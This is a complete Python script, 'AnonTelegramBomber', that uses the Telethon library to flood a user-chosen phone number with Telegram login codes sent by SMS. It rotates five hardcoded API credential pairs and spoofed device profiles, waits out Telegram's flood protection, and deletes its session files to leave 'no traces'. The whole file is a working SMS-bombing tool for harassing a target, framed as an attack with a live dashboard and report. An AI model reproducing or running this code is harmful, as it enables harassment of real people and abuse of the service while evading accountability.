import asyncio
import random
import string
import os
import sys
from telethon import TelegramClient
from telethon.errors import FloodWaitError, ApiIdInvalidError, PhoneNumberInvalidError
from telethon.network import ConnectionTcpAbridged
import threading
import time

class AnonTelegramBomber:
    def __init__(self):
        self.accounts = [
            {
                'session': 'account1',
                'api_id': 26096800,
                'api_hash': 'f4af999918de6130d434c95f9ae7db70'
            },
            {
                'session': 'account2',
                'api_id': '27907307',
                'api_hash': "ccab57203eb113530f8f964ca54aba6a"
            },
            {
                'session': 'account3',
                'api_id': 27829891,
                'api_hash': '00b3991771c8590897bf12f5917e5db5'
            },
            {
                'session': 'account4',
                'api_id': 21517480,
                'api_hash': '2d5026fd3633722638e98d86c471de1a'
            },
            {
                'session': 'account5',
                'api_id': 26284158,
                'api_hash': '35f76a2a07b59d88ae71dc1c1f3ef0fc'
            }
        ]
        self.success_count = 0
        self.failed_count = 0
        self.is_running = False
        self.current_attempt = 0
        self.total_attempts = 0
        self.last_status = ""
        
        # Enhanced device configurations
        self.device_configs = [
            {"device_model": "iPhone 15 Pro", "system_version": "iOS 17.0", "app_version": "10.0.0"},
            {"device_model": "Samsung Galaxy S24", "system_version": "Android 14", "app_version": "10.0.0"},
            {"device_model": "Google Pixel 8", "system_version": "Android 14", "app_version": "10.0.0"},
            {"device_model": "Xiaomi 14", "system_version": "Android 14", "app_version": "10.0.0"},
            {"device_model": "OnePlus 12", "system_version": "Android 14", "app_version": "10.0.0"},
        ]
        
        self.proxies = [None]

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        banner = """
                     Telegram log outer
                 Cyber Resistance Committee 
        """
        print(banner)

    def print_status(self, message, duration=5):
        """چاپ پیام و پاک کردن آن بعد از مدت مشخص"""
        print(f"\r{message}", end='', flush=True)
        self.last_status = message
        if duration > 0:
            time.sleep(duration)
            # پاک کردن خط با spaces
            print('\r' + ' ' * len(message) + '\r', end='', flush=True)

    def get_user_input(self):
        self.clear_screen()
        self.print_banner()
        
        print("═" * 50)
        print(f"📱 Available Accounts: {len(self.accounts)}")
        
        target_phone = input("🎯 Enter Target Phone Number (with country code): ").strip()
        if not target_phone:
            print("❌ Phone number cannot be empty!")
            sys.exit(1)
        
        if not target_phone.startswith("+"):
            target_phone = "+" + target_phone
        
        try:
            self.total_attempts = int(input("💣 Enter Number of Attacks (default 100): ") or "100")
        except ValueError:
            print("❌ Invalid number! Using default: 100")
            self.total_attempts = 100
            
        delay_min = input("⏰ Enter Minimum Delay Between Attacks (seconds, default 45): ") or "45"
        delay_max = input("⏰ Enter Maximum Delay Between Attacks (seconds, default 120): ") or "120"
        
        try:
            self.delay_range = (int(delay_min), int(delay_max))
        except ValueError:
            print("❌ Invalid delay! Using default: 45-120")
            self.delay_range = (45, 120)
        
        return target_phone

    def generate_session_name(self):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

    def get_random_device_config(self):
        return random.choice(self.device_configs)

    def get_random_proxy(self):
        return random.choice(self.proxies)

    def get_random_account(self):
        """Get a random account from available accounts"""
        return random.choice(self.accounts)

    async def send_sms_attack(self, target_phone, attempt_num):
        session_name = self.generate_session_name()
        device_config = self.get_random_device_config()
        proxy_config = self.get_random_proxy()
        account = self.get_random_account()
        
        client = None
        try:
            # نمایش وضعیت شروع
            self.print_status(f"🔄 Starting attack #{attempt_num} with {account['session']} on {device_config['device_model']}...", 2)
            
            # Create client with random account and configuration
            client = TelegramClient(
                f'sessions/{session_name}',
                int(account['api_id']),
                account['api_hash'],
                device_model=device_config["device_model"],
                system_version=device_config["system_version"],
                app_version=device_config["app_version"],
                connection=ConnectionTcpAbridged,
                proxy=proxy_config,
                request_retries=1,
                connection_retries=1,
                auto_reconnect=False
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                # نمایش وضعیت ارسال
                self.print_status(f"📤 Sending SMS to {target_phone} using {account['session']}...", 2)
                
                # Send code request
                result = await client.send_code_request(
                    phone=target_phone,
                    force_sms=True
                )
                
                self.success_count += 1
                self.current_attempt = attempt_num
                self.last_account = account['session']
                self.last_device = device_config['device_model']
                self.print_status(f"✅ Attack #{attempt_num} SUCCESS! {account['session']} sent SMS to {target_phone}", 3)
                return True
            else:
                self.print_status(f"⚠️ Session already authorized for {account['session']}", 2)
                return False
                
        except FloodWaitError as e:
            wait_time = e.seconds
            self.print_status(f"⏳ Flood protection on {account['session']}: Waiting {wait_time} seconds...", wait_time)
            await asyncio.sleep(wait_time + 2)
            self.failed_count += 1
            return False
            
        except (ApiIdInvalidError, PhoneNumberInvalidError) as e:
            self.print_status(f"❌ Configuration error in {account['session']}: {e}", 3)
            self.failed_count += 1
            return False
            
        except Exception as e:
            self.print_status(f"❌ Error in attack #{attempt_num} with {account['session']}: {str(e)[:50]}", 3)
            self.failed_count += 1
            return False
            
        finally:
            if client:
                await client.disconnect()
            
            # Clean up session file
            try:
                session_file = f'sessions/{session_name}.session'
                if os.path.exists(session_file):
                    os.remove(session_file)
            except:
                pass

    def update_display(self):
        """نمایش لحظه‌ای وضعیت حمله"""
        while self.is_running:
            self.clear_screen()
            self.print_banner()
            
            print("📊 LIVE ATTACK DASHBOARD")
            print("═" * 50)
            print(f"🎯 Target: {getattr(self, 'target_phone', 'Not set')}")
            print(f"📱 Available Accounts: {len(self.accounts)}")
            print(f"📈 Progress: {self.current_attempt}/{self.total_attempts}")
            print(f"✅ Successful: {self.success_count}")
            print(f"❌ Failed: {self.failed_count}")
            
            if self.total_attempts > 0:
                progress = (self.current_attempt / self.total_attempts) * 100
                print(f"📊 Completion: {progress:.1f}%")
                
                # Progress bar
                bar_length = 30
                filled = int(bar_length * self.current_attempt // self.total_attempts)
                bar = "█" * filled + "░" * (bar_length - filled)
                print(f"[{bar}]")
            
            print("\n⚡ REAL-TIME STATUS")
            print("═" * 50)
            if self.is_running:
                print("🟢 ATTACK IN PROGRESS...")
                print("💣 Actively sending verification codes...")
                print("🛡️ Using multiple accounts for anonymity...")
                print(f"📱 Last account used: {getattr(self, 'last_account', 'None')}")
                print(f"📱 Last device: {getattr(self, 'last_device', 'Unknown')}")
                
                # نمایش وضعیت لحظه‌ای
                if self.last_status:
                    print(f"\n📡 CURRENT ACTION: {self.last_status}")
            else:
                print("🔴 ATTACK STOPPED")
                
            print("\n" + "═" * 50)
            print("Press Ctrl+C to stop the attack")
            time.sleep(1)

    async def start_attack(self, target_phone):
        self.target_phone = target_phone
        self.is_running = True
        
        # Start display thread
        display_thread = threading.Thread(target=self.update_display, daemon=True)
        display_thread.start()
        
        self.print_status("🚀 Initializing attack system...", 3)
        self.print_status(f"📡 Loading {len(self.accounts)} accounts...", 3)
        self.print_status("🛡️ Activating multi-account anonymity protocols...", 2)
        
        try:
            for i in range(1, self.total_attempts + 1):
                if not self.is_running:
                    break
                    
                success = await self.send_sms_attack(target_phone, i)
                
                # Random delay between attacks
                if i < self.total_attempts and self.is_running:
                    delay = random.randint(*self.delay_range)
                    self.print_status(f"⏰ Waiting {delay} seconds before next attack...", delay)
                    await asyncio.sleep(delay)
                    
        except KeyboardInterrupt:
            self.print_status("🛑 Attack interrupted by user", 3)
        finally:
            self.is_running = False
            await self.show_final_report()

    async def show_final_report(self):
        self.clear_screen()
        self.print_banner()
        
        print("📊 FINAL ATTACK REPORT")
        print("═" * 50)
        print(f"🎯 Target: {getattr(self, 'target_phone', 'Not set')}")
        print(f"📱 Accounts Used: {len(self.accounts)}")
        print(f"💣 Total Attempts: {self.total_attempts}")
        print(f"✅ Successful Attacks: {self.success_count}")
        print(f"❌ Failed Attacks: {self.failed_count}")
        
        if self.total_attempts > 0:
            success_rate = (self.success_count / self.total_attempts) * 100
            print(f"📈 Success Rate: {success_rate:.1f}%")
        
        print("\n🛡️ SECURITY STATUS")
        print("═" * 50)
        print("✅ All sessions destroyed")
        print("✅ Temporary files cleaned")
        print("✅ Multiple accounts rotated")
        print("✅ No traces left")
        print("✅ Anonymous mode: ACTIVE")
        
        print("\n" + "═" * 50)
        print("🔥 Attack completed! Stay anonymous! 🔥")

    def run(self):
        try:
            # Create sessions directory
            if not os.path.exists('sessions'):
                os.makedirs('sessions')
            
            target_phone = self.get_user_input()
            
            # Final confirmation
            print(f"\n⚠️ FINAL CONFIRMATION")
            print("═" * 50)
            print(f"Target: {target_phone}")
            print(f"Available Accounts: {len(self.accounts)}")
            print(f"Attacks: {self.total_attempts}")
            print(f"Delay Range: {self.delay_range[0]}-{self.delay_range[1]}s")
            
            confirm = input("\n🚀 Start the attack? (y/N): ").strip().lower()
            if confirm != 'y':
                print("❌ Attack cancelled!")
                return
            
            # Start the attack
            asyncio.run(self.start_attack(target_phone))
            
        except KeyboardInterrupt:
            print("\n❌ Operation cancelled by user!")
        except Exception as e:
            print(f"❌ Unexpected error: {e}")

if __name__ == "__main__":
    bomber = AnonTelegramBomber()
    bomber.run()
